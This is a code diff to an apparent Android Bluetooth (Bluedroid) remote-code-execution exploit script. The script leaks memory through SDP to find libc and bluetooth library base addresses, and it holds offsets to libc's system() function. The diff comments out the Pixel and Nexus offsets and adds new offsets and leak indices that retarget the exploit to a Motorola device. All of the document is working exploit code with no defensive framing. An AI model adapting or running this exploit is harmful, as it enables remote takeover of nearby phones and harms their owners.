@@ -27,12 +27,16 @@ STDIN_PORT = 1235
 # 0b5396cd15a60b4076dacced9df773f75482f537  /system/lib/libc.so
 
 # For Pixel 7.1.2 patch level Aug/July 2017
-LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1 - 56 # system + 1
-LIBC_SOME_BLX_OFFSET = 0x1a420 + 1 - 608 # eventfd_write + 28 + 1
+# LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1 - 56 # system + 1
+# LIBC_SOME_BLX_OFFSET = 0x1a420 + 1 - 608 # eventfd_write + 28 + 1
 
 # For Nexus 5X 7.1.2 patch level Aug/July 2017
 #LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1
 #LIBC_SOME_BLX_OFFSET = 0x1a420 + 1
+
+#Moto
+LIBC_TEXT_STSTEM_OFFSET = 0x34ea04 + 1 # system + 1
+LIBC_SOME_BLX_OFFSET = 0x585b
 
 # Aligned to 4 inside the name on the bss (same for both supported phones)
 BSS_ACL_REMOTE_NAME_OFFSET = 0x202ee4
@@ -95,8 +99,13 @@ def memory_leak_get_bases(src, src_hci, dst):
     result = bluedroid.do_sdp_info_leak(dst, src)
 
     # Calculate according to known libc.so and bluetooth.default.so binaries
-    likely_some_libc_blx_offset = result[-3][-2]
-    likely_some_bluetooth_default_global_var_offset = result[6][0]
+    #Nexus-Pixel
+    #likely_some_libc_blx_offset = result[-3][-2]
+    #likely_some_bluetooth_default_global_var_offset = result[6][0]
+    #Moto
+    likely_some_libc_blx_offset = result[6][2]
+    likely_some_bluetooth_default_global_var_offset = result[10][0]
+    
 
     libc_text_base = likely_some_libc_blx_offset - LIBC_SOME_BLX_OFFSET
     bluetooth_default_bss_base = likely_some_bluetooth_default_global_var_offset - BLUETOOTH_BSS_SOME_VAR_OFFSET
